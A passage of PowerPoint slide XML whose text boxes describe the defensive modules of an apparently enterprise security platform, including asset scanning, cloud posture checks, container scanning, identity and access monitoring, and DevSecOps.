          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="2715768"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Auto-assigns mandatory security awareness training on any phishing link click</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3145536"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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28600" y="3145536"/>
            <a:ext cx="3837432"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3236976"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Infra Scanner</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="TextBox 35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3493008"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Nmap-style scan of all registered assets — runs on-demand or on schedule</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3730752"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Discovers open ports, service banners, OS fingerprints, and TLS versions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3968496"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Matches discovered services against CVE database — immediate correlation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4206240"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Detects newly appeared services (shadow IT) not in the asset inventory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="4443984"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Results feed directly into Asset Inventory and update last-scan timestamps</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Rectangle 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4139184" y="3145536"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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39184" y="3145536"/>
            <a:ext cx="3837432"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30624" y="3236976"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Digital Twin</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="TextBox 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="3493008"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Live topology graph of all 10 logistics assets with network connections</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="TextBox 44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="3730752"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ CVE severity overlay on each node — red for CRITICAL, amber for HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="3968496"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Network segment boundaries drawn — shows which services can reach each other</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="4206240"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Click any node to open its asset detail page with full CVE list</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="4443984"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Auto-updated when the Infra Scanner completes a new scan</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Rectangle 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8049768" y="3145536"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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49768" y="3145536"/>
            <a:ext cx="3837432" cy="457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41208" y="3236976"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cloud Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="3493008"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ AWS, GCP and Azure posture checks via native security APIs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="TextBox 52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="3730752"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ GCP Security Command Center finding import — misconfigurations and threats</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="3968496"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Checks: open S3 buckets, over-permissive IAM roles, unencrypted volumes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="4206240"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ CIS Benchmarks score per cloud account — shows current vs target posture</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="4443984"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Alerts feed into the Incident Response queue for immediate triage</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Rectangle 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4873752"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="63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28600" y="4873752"/>
            <a:ext cx="3837432"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0040" y="4965192"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Container Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="TextBox 59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="5221224"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Docker image CVE scanning via Trivy and Grype on every registry push</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="TextBox 60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="5458968"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Kubernetes workload hardening assessment — privileged containers, root users</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="5696712"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Runtime policy enforcement — blocks containers violating security policy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="5934456"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Base image age tracking — alerts when base image is &gt;90 days without update</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="TextBox 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="6172200"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Results mapped to specific CVEs and linked to patch recommendations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Rectangle 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4139184" y="4873752"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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139184" y="4873752"/>
            <a:ext cx="3837432"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30624" y="4965192"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Identity &amp; Access</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="TextBox 67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="5221224"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Full IAM inventory: users, groups, roles, service accounts, API keys</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="TextBox 68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="5458968"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ MFA coverage dashboard — currently 78% admin accounts (target: 100%)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="5696712"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Privileged access review workflow with approval and expiry tracking</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="5934456"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Anomalous login detection: unusual hours, new geo-location, bulk access</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="TextBox 71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="6172200"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Links to incident response when a compromised credential is detected</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="Rectangle 72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8049768" y="4873752"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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049768" y="4873752"/>
            <a:ext cx="3837432" cy="45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141208" y="4965192"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DevSecOps</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="TextBox 75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
